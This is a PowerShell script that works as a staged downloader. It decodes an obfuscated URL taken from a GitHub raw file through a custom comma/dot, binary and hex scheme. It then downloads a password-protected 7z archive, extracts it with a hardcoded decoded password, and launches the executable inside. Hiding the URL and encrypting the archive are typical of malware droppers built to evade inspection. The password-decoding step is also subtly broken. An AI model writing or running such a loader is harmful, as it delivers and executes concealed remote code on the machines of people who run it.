# Function to replace characters in the input string according to the custom encoding
Function Convert-CustomEncodingToBinaryString {
    Param ([string]$inputString)
    $binaryString = $inputString -replace ',', '0' -replace '\.', '1' -replace '/', ','
    return $binaryString
}

# Function to convert binary string (delimited by commas) to ASCII text
Function Convert-BinaryToText {
    Param ([string]$binaryInput)
    $asciiOutput = @()
    $binaryValues = $binaryInput -split ','

    foreach ($value in $binaryValues) {
        if ($value.Length -eq 8) {
            try {
                $asciiOutput += [convert]::ToChar([convert]::ToInt32($value, 2))
            } catch {
                Write-Error "Invalid binary value: $value"
            }
        }
    }

    return -join $asciiOutput
}

# Function to convert hex string (delimited by commas) to ASCII text
Function Convert-HexToText {
    Param ([string]$hexInput)
    $asciiOutput = @()
    $hexValues = $hexInput -split ','

    foreach ($value in $hexValues) {
        if ($value.Length -eq 2) {
            try {
                $asciiOutput += [char][convert]::ToInt32($value, 16)
            } catch {
                Write-Error "Invalid hex value: $value"
            }
        }
    }

    return -join $asciiOutput
}

# Function to download and extract 7-Zip command line version
Function DownloadAndExtract7Zip {
    $sevenZipUrl = "https://www.7-zip.org/a/7z1900-extra.7z" # Update this URL as necessary
    $sevenZipDownloadPath = "S:\7zip.7z"
    $sevenZipExtractPath = "S:\7zip"
    Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipDownloadPath -ErrorAction Stop

    # Assuming 7z.exe is already available in the system path for initial extraction
    & 7z x $sevenZipDownloadPath -o$sevenZipExtractPath
}

# Function to decrypt hardcoded binary string to get password
Function Get-DecryptedPassword {
    $hardcodedBinary = "0100100001100101011011000110110001101111" # Example binary for "Hello"
    $password = Convert-BinaryToText -binaryInput $hardcodedBinary
    return $password
}

# URL of the hosted text file
$url = "https://raw.githubusercontent.com/asd/4ds/main/3.txt" # Replace this with the actual URL

# Fetch the content from the URL
$rawText = Invoke-RestMethod -Uri $url -ErrorAction Stop

# Convert the raw text to binary, then to hex, and finally to ASCII text (URL)
$binaryString = Convert-CustomEncodingToBinaryString -inputString $rawText
$hexText = Convert-BinaryToText -binaryInput $binaryString
$finalUrl = Convert-HexToText -hexInput $hexText
$finalUrl = $finalUrl + 'e'

# Download the file using the modified URL
$downloadPath = "S:\DownloadedFile.7z"
Invoke-WebRequest -Uri $finalUrl -OutFile $downloadPath -ErrorAction Stop

# Download and extract 7-Zip command line version
DownloadAndExtract7Zip

# Get the password from the hardcoded binary string
$password = Get-DecryptedPassword

# Unzip the downloaded file using the password
$sevenZipCmdPath = "S:\7zip\7z.exe" # Update this path as necessary
& $sevenZipCmdPath x $downloadPath -o"S:\ExtractedFile" -p$password

# Execute the extracted file (assuming it's an executable)
$extractedFilePath = "S:\ExtractedFile\YourExecutable.exe" # Update this path and filename as necessary
if (Test-Path -Path $extractedFilePath) {
    Invoke-Item $extractedFilePath
} else {
    Write-Error "The extracted file at path $extractedFilePath does not exist."
}
